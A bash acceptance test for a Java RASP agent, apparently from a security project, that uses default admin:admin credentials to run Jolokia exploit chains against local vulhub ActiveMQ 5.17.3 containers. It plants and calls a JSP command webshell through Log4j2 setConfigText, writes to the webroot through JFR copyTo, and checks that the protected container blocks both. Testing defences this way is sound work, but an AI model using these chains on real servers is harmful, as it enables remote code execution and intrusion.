#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_ACTIVEMQ517_IMAGE:-vulhub/activemq:5.17.3}"
baseline_name="${OHMYRASP_VULHUB_ACTIVEMQ517_BASELINE_NAME:-ohmyrasp-vulhub-activemq517-baseline}"
protected_name="${OHMYRASP_VULHUB_ACTIVEMQ517_PROTECTED_NAME:-ohmyrasp-vulhub-activemq517-protected}"
baseline_port="${OHMYRASP_VULHUB_ACTIVEMQ517_BASELINE_PORT:-18271}"
protected_port="${OHMYRASP_VULHUB_ACTIVEMQ517_PROTECTED_PORT:-18272}"
host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"
baseline_dir="logs/vulhub-activemq-5.17.3-java11-baseline"
protected_dir="logs/vulhub-activemq-5.17.3-java11-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8161" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8161" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true" \
  "$image" >/dev/null

jolokia() {
  local port="$1"
  local payload="$2"
  local output="$3"
  curl -sS -u admin:admin \
    -H 'Origin: http://127.0.0.1:8161' \
    -H 'Content-Type: application/json' \
    -o "$output" \
    -w "%{http_code}" \
    -d "$payload" \
    "http://127.0.0.1:${port}/api/jolokia/"
}

jolokia_file() {
  local port="$1"
  local payload_file="$2"
  local output="$3"
  curl -sS -u admin:admin \
    -H 'Origin: http://127.0.0.1:8161' \
    -H 'Content-Type: application/json' \
    -o "$output" \
    -w "%{http_code}" \
    --data-binary @"$payload_file" \
    "http://127.0.0.1:${port}/api/jolokia/"
}

wait_for() {
  local name="$1"
  local port="$2"
  for _ in $(seq 1 150); do
    if curl -fsS -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
      "http://127.0.0.1:${port}/api/jolokia/version" >/dev/null 2>&1; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose authenticated Jolokia at ${port}" >&2
  exit 1
}

record_value() {
  python3 - "$1" <<'PY'
import json
import sys
with open(sys.argv[1], encoding="utf-8") as handle:
    print(json.load(handle).get("value", ""))
PY
}

log4j2_webshell='<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); out.println(org.apache.commons.io.IOUtils.toString(p.getInputStream(), "utf-8")); %>'

write_log4j2_templates() {
  local dir="$1"
  cat > "${dir}/log4j-original.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%5p | %m%n"/>
        </Console>
        <RollingRandomAccessFile name="RollingFile" fileName="${sys:activemq.data}/activemq.log"
            filePattern="${sys:activemq.data}/activemq.log.%i">
            <PatternLayout pattern="%d | %-5p | %m | %c | %t%n%throwable{full}"/>
            <Policies>
                <SizeBasedTriggeringPolicy size="1MB"/>
            </Policies>
        </RollingRandomAccessFile>
        <RollingRandomAccessFile name="AuditLog" fileName="${sys:activemq.data}/audit.log" filePattern="${sys:activemq.data}/audit.log.%i">
            <PatternLayout pattern="%-5p | %m | %t%n"/>
            <Policies>
                <SizeBasedTriggeringPolicy size="1MB"/>
            </Policies>
        </RollingRandomAccessFile>
    </Appenders>
    <Loggers>
        <Root level="INFO">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFile"/>
        </Root>
        <Logger name="org.apache.activemq.spring" level="WARN"/>
        <Logger name="org.apache.activemq.web.handler" level="WARN"/>
        <Logger name="org.springframework" level="WARN"/>
        <Logger name="org.apache.xbean" level="WARN"/>
        <Logger name="org.eclipse.jetty" level="WARN"/>
        <Logger name="org.apache.activemq.audit" level="INFO" additivity="false">
            <AppenderRef ref="AuditLog"/>
        </Logger>
    </Loggers>
</Configuration>
EOF

  cat > "${dir}/log4j-evil.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%5p | %m%n"/>
        </Console>
        <RollingRandomAccessFile name="RollingFile" fileName="${sys:activemq.data}/../webapps/admin/shell.jsp"
            filePattern="${sys:activemq.data}/../webapps/admin/shell.jsp.%i">
            <PatternLayout pattern="%d | %-5p | %m | %c | %t%n%throwable{full}"/>
            <Policies>
                <SizeBasedTriggeringPolicy size="1MB"/>
            </Policies>
        </RollingRandomAccessFile>
        <RollingRandomAccessFile name="AuditLog" fileName="${sys:activemq.data}/audit.log" filePattern="${sys:activemq.data}/audit.log.%i">
            <PatternLayout pattern="%-5p | %m | %t%n"/>
            <Policies>
                <SizeBasedTriggeringPolicy size="1MB"/>
            </Policies>
        </RollingRandomAccessFile>
    </Appenders>
    <Loggers>
        <Root level="INFO">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFile"/>
        </Root>
        <Logger name="org.apache.activemq.spring" level="WARN"/>
        <Logger name="org.apache.activemq.web.handler" level="WARN"/>
        <Logger name="org.springframework" level="WARN"/>
        <Logger name="org.apache.xbean" level="WARN"/>
        <Logger name="org.eclipse.jetty" level="DEBUG"/>
        <Logger name="org.apache.activemq.audit" level="INFO" additivity="false">
            <AppenderRef ref="AuditLog"/>
        </Logger>
    </Loggers>
</Configuration>
EOF
}

log4j2_mbean() {
  python3 - "$1" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as handle:
    data = json.load(handle)

for name, value in data.get("value", {}).items():
    if name == "org.apache.logging.log4j2":
        for type_name in value.keys():
            if type_name.startswith("type="):
                print(f"{name}:{type_name}")
                raise SystemExit(0)

raise SystemExit("no org.apache.logging.log4j2 MBean found")
PY
}

write_log4j2_payload() {
  local mbean="$1"
  local template_file="$2"
  local output="$3"
  python3 - "$mbean" "$template_file" "$output" <<'PY'
import json
import sys

mbean, template_file, output = sys.argv[1:]
with open(template_file, encoding="utf-8") as handle:
    template = handle.read()

payload = {
    "type": "exec",
    "mbean": mbean,
    "operation": "setConfigText",
    "arguments": [template, "utf-8"],
}
with open(output, "w", encoding="utf-8") as handle:
    json.dump(payload, handle)
PY
}

run_log4j2_set_config_chain() {
  local port="$1"
  local container="$2"
  local dir="$3"
  local prefix="$4"
  local list_file="${dir}/log4j-jolokia-list.json"
  local mbean payload status

  write_log4j2_templates "$dir"
  curl -fsS -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
    "http://127.0.0.1:${port}/api/jolokia/list" \
    > "$list_file"
  mbean="$(log4j2_mbean "$list_file")"
  printf '%s\n' "$mbean" > "${dir}/log4j-mbean.txt"

  docker exec "$container" sh -c 'rm -f /opt/activemq/webapps/admin/shell.jsp /opt/activemq/webapps/admin/shell.jsp.*' >/dev/null
  docker exec "$container" sh -c 'test ! -e /opt/activemq/webapps/admin/shell.jsp'

  payload="${dir}/log4j-setConfigText-evil-payload.json"
  write_log4j2_payload "$mbean" "${dir}/log4j-evil.xml" "$payload"
  status="$(jolokia_file "$port" "$payload" "${dir}/log4j-setConfigText-evil.json" || true)"

  if [[ "$prefix" == "baseline" ]]; then
    if [[ ! "$status" =~ ^2 ]] || ! grep -q '"status":200' "${dir}/log4j-setConfigText-evil.json"; then
      cat "${dir}/log4j-setConfigText-evil.json" >&2 || true
      echo "${prefix} ActiveMQ Log4j2 setConfigText did not accept the malicious config" >&2
      exit 1
    fi

    curl -fsS -u admin:admin \
      -H 'Origin: http://127.0.0.1:8161' \
      -H "User-Agent: Mozilla ||| ${log4j2_webshell} |||" \
      "http://127.0.0.1:${port}/api/jolokia/version" \
      > "${dir}/log4j-trigger-version.json"

    payload="${dir}/log4j-setConfigText-restore-payload.json"
    write_log4j2_payload "$mbean" "${dir}/log4j-original.xml" "$payload"
    status="$(jolokia_file "$port" "$payload" "${dir}/log4j-setConfigText-restore.json" || true)"
    if [[ ! "$status" =~ ^2 ]] || ! grep -q '"status":200' "${dir}/log4j-setConfigText-restore.json"; then
      cat "${dir}/log4j-setConfigText-restore.json" >&2 || true
      echo "${prefix} ActiveMQ Log4j2 setConfigText restore failed" >&2
      exit 1
    fi

    if ! docker exec "$container" sh -c 'test -s /opt/activemq/webapps/admin/shell.jsp'; then
      docker exec "$container" sh -c 'ls -l /opt/activemq/webapps/admin | sed -n "1,120p"' >&2 || true
      echo "${prefix} ActiveMQ Log4j2 setConfigText did not create shell.jsp" >&2
      exit 1
    fi
    docker cp "${container}:/opt/activemq/webapps/admin/shell.jsp" "${dir}/shell.jsp"
    if ! docker exec "$container" sh -c 'grep -q "Runtime.getRuntime().exec" /opt/activemq/webapps/admin/shell.jsp'; then
      sed -n '1,80p' "${dir}/shell.jsp" >&2
      echo "${prefix} ActiveMQ Log4j2 shell.jsp did not contain the expected JSP marker" >&2
      exit 1
    fi
    if ! curl -fsS -u admin:admin "http://127.0.0.1:${port}/admin/shell.jsp?cmd=id" > "${dir}/shell-id.txt"; then
      cat "${dir}/shell-id.txt" >&2 || true
      echo "${prefix} ActiveMQ Log4j2 shell.jsp request failed" >&2
      exit 1
    fi
    if ! grep -q 'uid=' "${dir}/shell-id.txt"; then
      cat "${dir}/shell-id.txt" >&2
      echo "${prefix} ActiveMQ Log4j2 shell.jsp did not execute id" >&2
      exit 1
    fi
    return
  fi

  if ! grep -q 'Java11RaspBlockException' "${dir}/log4j-setConfigText-evil.json"; then
    cat "${dir}/log4j-setConfigText-evil.json" >&2 || true
    echo "${prefix} ActiveMQ Log4j2 setConfigText was not blocked by Java11 RASP" >&2
    exit 1
  fi
  if docker exec "$container" sh -c 'test -e /opt/activemq/webapps/admin/shell.jsp'; then
    docker exec "$container" sh -c 'sed -n "1,20p" /opt/activemq/webapps/admin/shell.jsp' >&2 || true
    echo "${prefix} ActiveMQ Log4j2 setConfigText created shell.jsp despite Java11 RASP" >&2
    exit 1
  fi
}

run_jfr_copy_chain() {
  local port="$1"
  local dir="$2"
  local prefix="$3"
  local status record_id payload

  payload='{"type":"exec","mbean":"jdk.management.jfr:type=FlightRecorder","operation":"newRecording","arguments":[]}'
  status="$(jolokia "$port" "$payload" "${dir}/jfr-new-recording.json" || true)"
  if [[ ! "$status" =~ ^2 ]] || ! grep -q '"status":200' "${dir}/jfr-new-recording.json"; then
    cat "${dir}/jfr-new-recording.json" >&2 || true
    echo "${prefix} ActiveMQ JFR newRecording failed" >&2
    exit 1
  fi
  record_id="$(record_value "${dir}/jfr-new-recording.json")"
  if [[ ! "$record_id" =~ ^[0-9]+$ ]]; then
    cat "${dir}/jfr-new-recording.json" >&2
    echo "${prefix} ActiveMQ JFR newRecording did not return a numeric id" >&2
    exit 1
  fi

  for operation in startRecording stopRecording; do
    payload="$(printf '{"type":"exec","mbean":"jdk.management.jfr:type=FlightRecorder","operation":"%s","arguments":[%s]}' "$operation" "$record_id")"
    status="$(jolokia "$port" "$payload" "${dir}/jfr-${operation}.json" || true)"
    if [[ ! "$status" =~ ^2 ]] || ! grep -q '"status":200' "${dir}/jfr-${operation}.json"; then
      cat "${dir}/jfr-${operation}.json" >&2 || true
      echo "${prefix} ActiveMQ JFR ${operation} failed" >&2
      exit 1
    fi
  done

  payload="$(printf '{"type":"exec","mbean":"jdk.management.jfr:type=FlightRecorder","operation":"copyTo","arguments":[%s,"webapps/admin/shelljfr.jsp"]}' "$record_id")"
  jolokia "$port" "$payload" "${dir}/jfr-copyTo.json" > "${dir}/jfr-copyTo.http_status" || true
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

curl -fsS -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
  "http://127.0.0.1:${baseline_port}/api/jolokia/version" \
  > "${baseline_dir}/jolokia-version.json"
curl -fsS -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
  "http://127.0.0.1:${protected_port}/api/jolokia/version" \
  > "${protected_dir}/jolokia-version.json"

if ! grep -q '"event":"ohmyrasp-java11-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 11 startup event in ActiveMQ 5.17.3 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "ActiveMQ 5.17.3 protected startup produced a detection before the exploit request" >&2
  exit 1
fi

run_log4j2_set_config_chain "$baseline_port" "$baseline_name" "$baseline_dir" baseline
run_log4j2_set_config_chain "$protected_port" "$protected_name" "$protected_dir" protected

run_jfr_copy_chain "$baseline_port" "$baseline_dir" baseline
if ! grep -q '"status":200' "${baseline_dir}/jfr-copyTo.json"; then
  cat "${baseline_dir}/jfr-copyTo.json" >&2 || true
  echo "baseline ActiveMQ 5.17.3 JFR copyTo did not reach the vulnerable webroot write operation" >&2
  exit 1
fi

run_jfr_copy_chain "$protected_port" "$protected_dir" protected
if ! grep -q 'Java11RaspBlockException' "${protected_dir}/jfr-copyTo.json"; then
  cat "${protected_dir}/jfr-copyTo.json" >&2 || true
  echo "protected ActiveMQ 5.17.3 JFR copyTo was not blocked by Java11 RASP" >&2
  exit 1
fi

if ! grep -q '"algorithm":"java11_jmx_script_file_write".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java11_jmx_script_file_write block event for ActiveMQ 5.17.3" >&2
  exit 1
fi

echo "vulhub ActiveMQ 5.17.3 Java11 acceptance passed"
